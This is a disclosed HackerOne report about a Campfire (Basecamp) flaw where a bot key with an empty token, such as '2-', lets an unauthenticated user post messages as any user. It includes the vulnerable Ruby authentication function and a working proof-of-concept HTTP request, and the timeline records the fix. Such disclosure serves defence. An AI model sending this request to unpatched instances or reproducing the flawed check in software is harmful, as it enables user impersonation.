---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
  - trigger/auth-required
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2025-11-21
submitted: 2025-09-06T15:24:38.403Z
bounty_usd: 2000
votes: 128
cve: []
program: "[[programs/basecamp|Basecamp]]"
reporter: "stackered"
source: "https://hackerone.com/reports/3329310"
title: "Improper bot-authentication allows to impersonate any user when sending messages in a room"
---
# Improper bot-authentication allows to impersonate any user when sending messages in a room

> **Severity:** High | **Bounty:** 2,000 USD | **Votes:** 128 | **Program:** Basecamp | **Disclosed:** 2025-11-21

- Report: [https://hackerone.com/reports/3329310](https://hackerone.com/reports/3329310)
- CWE: Improper Authentication - Generic
- Submitted: 2025-09-06T15:24:38.403Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Bots are allowed to send messages in rooms but require a bot key to authenticate.
The bot key authentication function is as follows:

```ruby
def authenticate_bot(bot_key)
  bot_id, bot_token = bot_key.split("-")
  active.find_by(id: bot_id, bot_token: bot_token)
end
```

The issue is that if `bot_key` has no right-hand side (ex: `1-`), `bot_token` will be `nil`, and the query will match a `User` record if `bot_id` matches a valid ID.

IDs are incremental, as can be seen in the rails console, so they can be guessed easily. They are also visible in some URLs.

```
campfire(prod):038> User.active
=> 
[#<User:0x00007a444e940f18
  id: 1,
  name: "enoent",
  created_at: "2025-09-06 11:59:41.505220000 +0000",
  updated_at: "2025-09-06 14:08:08.788258000 +0000",
  role: "administrator",
  email_address: "[FILTERED]",
  password_digest: "[FILTERED]",
  active: true,
  bio: "<s>ddqsdqsds</s>",
  bot_token: nil>,
 #<User:0x00007a444e940dd8
  id: 2,
  name: "test",
  created_at: "2025-09-06 13:24:29.113250000 +0000",
  updated_at: "2025-09-06 13:42:26.539909000 +0000",
  role: "member",
  email_address: "[FILTERED]",
  password_digest: "[FILTERED]",
  active: true,
  bio: nil,
  bot_token: nil>,
 #<User:0x00007a444e940c98
```

The following request highlights the issue, as it allows an unauthenticated user to impersonate another user (here with ID `2`) and post messages on their behalf:

```
POST /rooms/2/2-/messages HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/vnd.turbo-stream.html, text/html, application/xhtml+xml
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 193

Hello ! I'm the test user, even though I'm not authenticated
```

The attached image shows that the message was successfully posted and appears to come from the "test" user.

## Impact

An unauthenticated user can send arbitrary messages as any user, in rooms the impersonated user have access to.

## Timeline

- **Report Filed**
- **2025-09-09** @jacopo-beschi: Thanks! I confirm the validity of the report.

I'll provide you with a bounty soon.
- **Report Severity Updated**
- **Report Severity Updated**
- **Report Severity Updated**
- **Report Severity Updated**
- **Report Severity Updated**
- **2025-09-10** @jacopo-beschi: Just a quick update: we’ll be removing bounties from Campfire, as the project is now open source and we no longer have funding for them. I’m discussing with the team how best to handle the existing reports.
I’ll keep you posted.
- **Bounty Awarded**
- **2025-09-10** @jacopo-beschi: Hi, I just provided you with a bounty of 2000$: We decided to provide bounty to existing Campfire reports but we'll no longer provide bounties to that assets.

We just released a fix in [release 1.1.8](https://github.com/basecamp/chatinabox/releases/tag/v1.1.8). Can you confirm you can no longer reproduce it? 

Thanks
- **Report Triaged**
- **2025-09-10** @stackered: Hi, thanks for the bounty !

I cannot access the link you provided to verify. I get a 404 error.
- **2025-09-11** @jacopo-beschi: Sorry, I just pushed the fix [to the OSS repo](https://github.com/basecamp/once-campfire), can you verify it now?

Thanks
- **2025-09-11** @stackered: Hi, I confirm that I cannot reproduce the issue after the patch.
- **2025-09-11** @jacopo-beschi: Great, thanks!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
